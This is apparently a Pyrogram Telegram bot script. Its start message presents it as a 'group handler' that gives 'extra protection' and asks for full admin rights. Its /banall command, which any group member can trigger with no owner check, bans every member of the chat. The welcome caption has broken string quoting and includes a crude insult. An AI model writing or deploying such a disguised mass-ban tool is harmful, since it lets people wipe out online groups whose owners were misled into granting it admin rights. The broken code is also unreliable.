import os
import logging
from os import getenv
from pyrogram import Client, filters, idle
from pyrogram.types import Message, InlineKeyboardMarkup, InlineKeyboardButton
from pyrogram.errors import ChatAdminRequired

logging.basicConfig(
    level=logging.DEBUG,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)
logging.getLogger("pyrogram").setLevel(logging.WARNING)

# config vars
API_ID = int(os.getenv("API_ID"))
API_HASH = os.getenv("API_HASH")
BOT_TOKEN = os.getenv("BOT_TOKEN")
OWNER = os.getenv("OWNER")

# pyrogram client
app = Client(
            "banall",
            api_id=API_ID,
            api_hash=API_HASH,
            bot_token=BOT_TOKEN,
)

@app.on_message(
filters.command("start")
& filters.private            
)
async def start_command(client, message: Message):
  await message.reply_photo(
                            photo = f"https://graph.org/file/68571759759f3d30ec472.jpg",
                            caption = f"ʜᴇʏ, ᴛʜɪs ɪs ᴀ sɪᴍᴘʟᴇ ɢʀᴏᴜᴘ ʜᴀɴᴅʟᴇʀ ʙᴏᴛ.ᴛʜɪs ʙᴏᴛ ᴄᴀɴ ᴘʀᴏᴠɪᴅᴇ ʏᴏᴜʀ ɢʀᴏᴜᴘ sᴏᴍᴇ ᴇxᴛʀᴀ ᴘʀᴏᴛᴇᴄᴛɪᴏɴ ғʀᴏᴍ sᴏᴍᴇ ᴄʜᴜᴛɪʏᴀs 
                            ᴍᴀᴋᴇ ᴍᴇ ᴀᴅᴍɪɴ ᴡɪᴛʜ ғᴜʟʟ ʀɪɢʜᴛs. ᴀɴᴅ sᴇᴇ ᴍʏ ᴀʙɪʟɪᴛɪᴇs!."
                        .",
  reply_markup=InlineKeyboardMarkup(
            [
                [
                    InlineKeyboardButton(
                        "ᴏᴡɴᴇʀ", url=f"https://t.me/Mrpasserby_1227")
                ]       
           ]
      )
)

@app.on_message(
filters.command("banall") 
& filters.group
)
async def banall_command(client, message: Message):
    print("getting memebers from {}".format(message.chat.id))
    async for i in app.get_chat_members(message.chat.id):
        try:
            await app.ban_chat_member(chat_id = message.chat.id, user_id = i.user.id)
            print("kicked {} from {}".format(i.user.id, message.chat.id))
        except Exception as e:
            print("failed to kicked {} from {}".format(i.user.id, e))           
    print("process completed")
    

# start bot client
app.start()
print("Banall-Bot Booted Successfully")
idle()
